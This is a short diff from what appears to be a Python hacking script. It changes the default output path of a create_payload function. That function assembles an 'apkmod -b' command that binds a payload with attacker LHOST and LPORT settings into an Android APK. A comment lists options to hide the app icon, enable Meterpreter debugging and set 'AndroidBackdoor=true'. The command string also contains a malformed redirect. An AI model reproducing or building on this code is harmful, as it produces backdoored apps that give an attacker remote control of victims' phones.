@@ -109,7 +109,7 @@ def in_put ():
     with open ('userinput.txt', 'w') as file:
         file.write(apkpath+' '+ip+' '+port)
 
-def create_payload (apkpath, ip, port ,name, path='/sdcard/sunnythakur/hacker.apk'):
+def create_payload (apkpath, ip, port ,name, path='/sdcard/sunnythakur/'):
 
     print ('\n'+box+'Creating Your Payload\n'+box+'Keep Patience.....\n'+blue)
     x = "apkmod -b "+apkpath+' -o '+path+name+' > /dev/null 2&>1'' LHOST='+ip+' LPORT='+port #this is for auto hide ' AndroidHideAppIcon=true AndroidMeterpreterDebug=true AndroidWakelock=true AndroidBackdoor=true'
